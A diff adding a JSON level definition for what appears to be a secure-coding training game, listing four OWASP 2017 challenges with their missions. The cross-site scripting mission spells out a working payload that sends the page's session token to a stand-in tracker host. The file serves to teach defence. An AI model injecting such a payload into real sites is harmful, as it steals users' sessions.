@@ -1,0 +1,40 @@
+[
+    {
+        "level":0,
+        "name":"Second Degree Black Belt - Part 1",
+        "challenges":[
+            {
+                "id":"owasp2017misconfig",
+                "name":"Security Misconfiguration", 
+                "playLink":"",
+                "description": "owasp2017misconfig.html",
+                "codeBlockIds":["enforceSafeConfig"],
+                "mission": "Find the secret file."
+            },
+            {
+                "id":"owasp2017sensitive",
+                "name":"Sensitive Data Exposure", 
+                "description": "owasp2017sensitive.html",
+                "attackGram":"missingenc.png",
+                "codeBlockIds":["useStrongDataEncryption"],
+                "mission": "Login as the test user."
+            },
+            {
+                "id":"owasp2017brokenauth",
+                "name":"Broken Authentication & Broken Access Control", 
+                "description": "owasp2017brokenauth.html",
+                "attackGram":"missingauthz.png",
+                "codeBlockIds":["loginBestPractices","principleOfLeastPrivilege","serverSideValidation"],
+                "mission": "View the chat messages."
+            },
+            {
+                "id":"owasp2017xss",
+                "name":"Cross-Site Scripting", 
+                "description": "owasp2017xss.html",
+                "attackGram":"xss.png",
+                "codeBlockIds":["neutralizeOutput","inputAllowListing","requestForgeryPrevention"],
+                "mission":"Alter the html code of the page by inserting the following tag: <img src=bla onerror=\"fetch('https://xss.tracker?token='+sessionStorage.token)\">"
+            }
+        ]
+    }
+]
